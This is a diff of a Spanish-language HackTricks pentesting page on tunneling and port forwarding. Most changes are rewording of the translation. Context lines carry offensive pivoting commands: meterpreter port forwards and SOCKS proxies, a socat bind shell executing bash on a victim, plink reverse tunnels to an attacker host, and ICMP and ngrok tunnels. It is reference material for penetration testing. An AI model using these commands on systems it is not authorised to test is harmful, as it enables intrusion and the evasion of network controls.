@@ -2,12 +2,12 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
@@ -79,7 +79,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Túnel
 
-Necesitas **root en ambos dispositivos** (ya que vas a crear nuevas interfaces) y la configuración de sshd tiene que permitir el inicio de sesión como root:\
+Necesitas **tener permisos de root en ambos dispositivos** (ya que vas a crear nuevas interfaces) y la configuración de sshd debe permitir el inicio de sesión como root:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -115,14 +115,14 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Puerto local --> Host comprometido (sesión activa) --> Tercera\_caja:Puerto
+Puerto local --> Host comprometido (sesión activa) --> Tercer\_equipo:Puerto
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-SOCKS (Socket Secure) es un protocolo de red que permite el enrutamiento de paquetes entre un cliente y un servidor a través de un servidor proxy. SOCKS opera en una capa más baja que HTTPs y proporciona un mayor grado de anonimato.
+SOCKS (Socket Secure) es un protocolo de red que permite el enrutamiento de paquetes entre un cliente y un servidor a través de un servidor proxy. SOCKS se utiliza comúnmente en situaciones donde se necesita atravesar firewalls o restricciones de red.
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -130,19 +130,7 @@ use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
-### Tunneling and Port Forwarding
-
-#### Tunneling
-
-Tunneling is a method that allows data to be transferred securely over a public network. It involves encapsulating the data in another protocol to create a secure communication channel. This can be useful for bypassing network restrictions, accessing geographically restricted content, or securing communications over untrusted networks.
-
-There are several tools available for creating tunnels, such as SSH, VPNs, and proxy servers. These tools can be used to create encrypted tunnels that protect data from being intercepted or tampered with by malicious actors.
-
-#### Port Forwarding
-
-Port forwarding is a technique used to redirect network traffic from one port to another. It can be used to bypass firewalls, access services on a remote network, or expose a local service to the internet. Port forwarding can be set up using routers, proxy servers, or specialized software.
-
-By combining tunneling and port forwarding, hackers can create secure communication channels and access restricted resources without being detected. These techniques are commonly used in penetration testing and cybersecurity to bypass security measures and gather information from target systems.
+Otra forma:
 ```bash
 background #meterpreter session
 use post/multi/manage/autoroute
@@ -159,7 +147,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### Proxy SOCKS
 
-Abra un puerto en el servidor de equipo escuchando en todas las interfaces que se pueden usar para **enrutar el tráfico a través del beacon**.
+Abre un puerto en el teamserver escuchando en todas las interfaces que se pueden usar para **rutar el tráfico a través del beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -189,7 +177,7 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Necesitas cargar un archivo web de túnel: ashx|aspx|js|jsp|php|php|jsp
+Necesitas cargar un archivo de túnel web: ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
@@ -237,7 +225,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Conexión de enlace
+### Conexión de escucha
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
@@ -299,9 +287,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-Es como una versión de consola de PuTTY (las opciones son muy similares a las de un cliente ssh).
+Es como una versión de consola de PuTTY (las opciones son muy similares a un cliente ssh).
 
-Dado que este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio ssh y puerto para poder tener una conexión inversa. Luego, para reenviar solo un puerto accesible localmente a un puerto en nuestra máquina:
+Dado que este binario se ejecutará en la víctima y es un cliente ssh, necesitamos abrir nuestro servicio ssh y puerto para poder tener una conexión inversa. Luego, para reenviar solo el puerto accesible localmente a un puerto en nuestra máquina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -325,7 +313,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Necesitas tener **acceso RDP sobre el sistema**.\
 Descarga:
 
-1. [Binarios SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza los `Canales Virtuales Dinámicos` (`DVC`) de la característica de Servicio de Escritorio Remoto de Windows. DVC es responsable de **tunelizar paquetes sobre la conexión RDP**.
+1. [Binarios SocksOverRDP x64](https://github.com/nccgroup/SocksOverRDP/releases) - Esta herramienta utiliza `Canales Virtuales Dinámicos` (`DVC`) del servicio de Escritorio Remoto de Windows. DVC es responsable de **tunelizar paquetes sobre la conexión RDP**.
 2. [Binario Portátil de Proxifier](https://www.proxifier.com/download/#win-tab)
 
 En tu computadora cliente carga **`SocksOverRDP-Plugin.dll`** de esta manera:
@@ -345,11 +333,11 @@ netstat -antb | findstr 1080
 ```
 Ahora puedes usar [**Proxifier**](https://www.proxifier.com/) **para enrutar el tráfico a través de ese puerto.**
 
-## Proxificar aplicaciones GUI de Windows
+## Enrutar aplicaciones GUI de Windows
 
-Puedes hacer que las aplicaciones GUI de Windows naveguen a través de un proxy utilizando [**Proxifier**](https://www.proxifier.com/).\
+Puedes hacer que las aplicaciones GUI de Windows naveguen a través de un proxy usando [**Proxifier**](https://www.proxifier.com/).\
 En **Profile -> Proxy Servers** agrega la IP y el puerto del servidor SOCKS.\
-En **Profile -> Proxification Rules** agrega el nombre del programa a proxificar y las conexiones a las IPs que deseas proxificar.
+En **Profile -> Proxification Rules** agrega el nombre del programa a enrutar y las conexiones a las IPs que deseas enrutar.
 
 ## Bypass de proxy NTLM
 
@@ -363,7 +351,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
 Autentica contra un proxy y enlaza un puerto local que se reenvía al servicio externo que especifiques. Luego, puedes utilizar la herramienta que elijas a través de este puerto.\
-Por ejemplo, reenvía el puerto 443.
+Por ejemplo, reenviar el puerto 443.
 ```
 Username Alice
 Password P@ssw0rd
@@ -371,7 +359,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Ahora, si configuras, por ejemplo, en la víctima el servicio **SSH** para escuchar en el puerto 443. Puedes conectarte a través del puerto 2222 del atacante.\
+Ahora, si configuras, por ejemplo, en la víctima el servicio **SSH** para escuchar en el puerto 443. Puedes conectarte a él a través del puerto 2222 del atacante.\
 También podrías usar un **meterpreter** que se conecta a localhost:443 y el atacante está escuchando en el puerto 2222.
 
 ## YARP
@@ -421,20 +409,20 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Cambiar el DNS de proxychains
 
-Proxychains intercepta la llamada `gethostbyname` de la biblioteca **libc** y canaliza la solicitud de DNS tcp a través del proxy **socks**. Por **defecto**, el servidor **DNS** que usa proxychains es **4.2.2.2** (codificado). Para cambiarlo, edita el archivo: _/usr/lib/proxychains3/proxyresolv_ y cambia la IP. Si estás en un entorno de **Windows**, podrías configurar la IP del **controlador de dominio**.
+Proxychains intercepta la llamada de la biblioteca `gethostbyname` y canaliza la solicitud de DNS tcp a través del proxy socks. Por **defecto**, el servidor **DNS** que usa proxychains es **4.2.2.2** (codificado). Para cambiarlo, edita el archivo: _/usr/lib/proxychains3/proxyresolv_ y cambia la IP. Si estás en un entorno de **Windows**, podrías configurar la IP del **controlador de dominio**.
 
 ## Túneles en Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## Túneles ICMP
+## Túnel ICMP
 
 ### Hans
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Se necesita acceso de root en ambos sistemas para crear adaptadores **tun** y canalizar datos entre ellos utilizando solicitudes de eco ICMP.
+Se necesita acceso de root en ambos sistemas para crear adaptadores tun y canalizar datos entre ellos utilizando solicitudes de eco ICMP.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -477,7 +465,7 @@ chmod a+x ./ngrok
 
 *También es posible agregar autenticación y TLS, si es necesario.*
 
-#### Túneles TCP
+#### Tunelización TCP
 ```bash
 # Pointing to 0.0.0.0:4444
 ./ngrok tcp 4444
@@ -526,12 +514,12 @@ addr: file:///tmp/httpbin/
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres que tu **empresa sea anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión del PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
